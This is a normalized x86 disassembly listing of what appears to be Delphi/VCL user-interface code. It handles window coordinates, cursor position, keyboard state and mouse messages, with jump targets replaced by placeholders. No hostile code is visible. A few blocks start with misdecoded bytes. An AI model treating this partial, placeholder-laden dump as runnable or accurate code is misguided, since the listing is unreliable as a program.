movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_43db40
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403234
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_436cf8
test esi esi
je r-xdata
sub_438238
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403430
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_4390bc
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403430
mov eax esi
call sub_436da0
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_436d5c
mov ecx eax
xor edx edx
xor eax eax
call sub_41240c
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403430
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_4382dc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43830c
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_438378
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_438438
sub_4383a8
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_4383d8
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_436e9c
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_438404
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_438438
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_43850c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_438540
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_4385d8
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_44e0b4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_44e0b4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_436ef8
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_457860
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_403430
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_44dff8
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_403430
jmp r-xdata
sub_43876c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408564
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408590
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_436ef8
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4083a8
call sub_408344
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408344
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_438814
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_438844
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_438808
push ebp
call sub_438814
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_438892
add [ eax ] al
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_438920
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_438958
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_4383d8
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df68
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403430
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df68
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_403430
sub_4389dc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_436ec8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_437590
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_438958
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_438a28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_436ec8
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_438a44
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_436ec8
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_437590
mov al [ r-xdata ]
push eax
mov edx edi
xor ecx ecx
mov eax ebx
call sub_438958
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffe9
call sub_403430
sub_438a9c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
mov [ esp ] eax
mov eax [ ebp ]
mov [ esp + 0x4 ] eax
lea ecx [ esp + 0x4 ]
mov edx esp
mov eax esi
call sub_438378
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov bl 0x1
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_43830c
test al al
je r-xdata
mov eax [ esp + 0x8 ]
mov [ edi ] eax
mov eax [ esp + 0xc ]
mov [ ebp ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
call sub_438378
test al al
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esp ]
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esp + 0x4 ]
je r-xdata
test bl bl
je r-xdata
sub_438b38
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_438958
pop esi
pop ebx
retn
sub_438b5d
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x1
mov eax ebx
call sub_438958
pop esi
pop ebx
retn
sub_438b83
add [ eax ] al
add [ eax ] al
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_438958
pop esi
pop ebx
retn
sub_438bad
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov al [ r-xdata ]
push eax
mov edx esi
mov cl 0x2
mov eax ebx
call sub_438958
pop esi
pop ebx
retn
sub_438bd3
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] dl
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ebx eax
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_438c08
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x51 ] 0x10
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x8000
jg r-xdata
mov edx esp
mov eax ebx
call sub_4383d8
mov eax [ esp + 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df68
mov edx eax
mov ecx [ esp + 0x4 ]
mov eax ebx
mov si 0xffd4
call sub_403430
jmp r-xdata
cmp [ ebx + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df68
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax ebx
mov si 0xffd4
call sub_403430
sub_438c80
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_438cb8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_44df68
mov ecx eax
mov edx ebx
mov eax edi
mov si 0xffd3
call sub_403430
sub_438cf0
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x54 ] 0x2
je r-xdata
xor edx edx
mov eax ebx
call sub_437590
mov edx edi
xor ecx ecx
mov eax ebx
call sub_438cb8
add esp 0x18
pop edi
pop esi
pop ebx
retn
and [ ebx + 0x54 ] 0xfffd
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406850
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403430
sub_438d68
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x1
mov eax ebx
call sub_438cb8
pop esi
pop ebx
retn
sub_438d88
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
mov cl 0x2
mov eax ebx
call sub_438cb8
pop esi
pop ebx
retn
sub_438da8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0x4 ]
call sub_44df68
mov [ ebx + 0x4 ] al
mov edx ebx
mov eax edi
mov si 0xffc9
call sub_403430
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x20 ] 0x1
mov edx 0x68
mov eax [ rw-data ]
call sub_442498
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_438e00
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_437580
test al al
je r-xdata
and [ esi + 0x54 ] 0xfffe
xor edx edx
mov eax esi
call sub_437590
test [ esi + 0x54 ] 0x1
je r-xdata
pop esi
retn
push 0xffffffff
xor ecx ecx
mov edx 0x202
mov eax esi
call sub_43850c
pop esi
retn
sub_438e40
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x74 ]
mov edx [ eax + 0xc ]
test edx edx
jbe r-xdata
mov edx [ eax + 0x14 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jge r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x48 ]
jle r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x10 ]
test edx edx
jbe r-xdata
cmp edx [ ebx + 0x4c ]
jge r-xdata
mov edx [ ebx + 0x48 ]
mov [ eax + 0x14 ] edx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
cmp edx [ ebx + 0x4c ]
jle r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x8 ] edx
jmp r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov edx [ ebx + 0x4c ]
mov [ eax + 0x10 ] edx
test [ ebx + 0x55 ] 0x4
jne r-xdata
test [ eax + 0x18 ] 0x1
jne r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_438540
sub_438eee
add [ eax ] al
test [ eax + 0x1c ] 0x10
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
test [ eax + 0x51 ] 0x4
je r-xdata
xor ecx ecx
jmp r-xdata
test [ eax + 0x50 ] 0x40
jne r-xdata
retn
mov dl 0x1
call sub_4377a0
mov cl 0x1
sub_438f30
push ebx
mov ebx eax
cmp [ ebx + 0x5a ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x70 ]
mov eax ebx
call sub_4374f8
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_4374f8
jmp r-xdata
mov [ ebx + 0x5a ] 0x1
sub_438f60
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0x60 ] 0x1
mov dl [ esi + 0x5f ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
sub_438f84
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
xor eax eax
mov [ ebx + 0xc ] eax
mov edx esp
mov eax [ ebx + 0x8 ]
call sub_406850
push esp
movsx ecx [ ebx + 0x6 ]
mov dl [ ebx + 0x4 ]
mov eax edi
mov si 0xffe2
call sub_403430
test al al
je r-xdata
mov esi [ edi + 0x30 ]
test esi esi
je r-xdata
mov [ ebx + 0xc ] 0x1
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx 0xb043
mov eax esi
call sub_43850c
mov [ ebx + 0xc ] eax
sub_439028
push ebx
mov ebx eax
cmp [ ebx + 0x59 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_43744c
mov edx [ edx + 0x8 ]
mov eax ebx
call sub_43744c
jmp r-xdata
mov [ ebx + 0x59 ] 0x1
sub_4390bc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
xor esi esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
test eax eax
je r-xdata
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov edi eax
mov eax ebx
call sub_40317c
cmp edi eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov ecx [ rw-data ]
mov ecx [ ecx ]
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov edx [ esp + 0x4 ]
mov eax esi
call sub_436aec
mov edx [ esp ]
mov eax esi
call sub_436ac8
mov edx [ esp + 0x8 ]
sub edx [ esp ]
mov eax esi
call sub_436d74
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
mov eax esi
call sub_436db8
sub_439140
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
lea ecx [ ebp - 0x10 ]
mov eax [ edi ]
mov edx [ eax + 0x44 ]
mov eax [ edi ]
mov eax [ eax + 0x40 ]
call sub_4123e4
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov eax [ eax + 0x30 ]
call sub_436e70
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0x44 ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
mov edx [ edi ]
mov esi [ edx + 0x30 ]
add eax [ esi + 0x4c ]
mov edx [ edi ]
sub eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
add ecx [ esi + 0x48 ]
mov eax [ edi ]
sub ecx [ eax + 0x48 ]
mov edx [ esi + 0x44 ]
add edx [ ebx + 0x4 ]
sub edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
add eax [ ebx ]
sub eax [ ebp - 0x8 ]
call sub_412434
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_436d18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4391cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea edx [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_4390bc
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
mov eax ebx
call sub_43db40
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx + 0x8 ] eax
push ebp
call sub_439140
pop ecx
jmp r-xdata
sub_43922c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
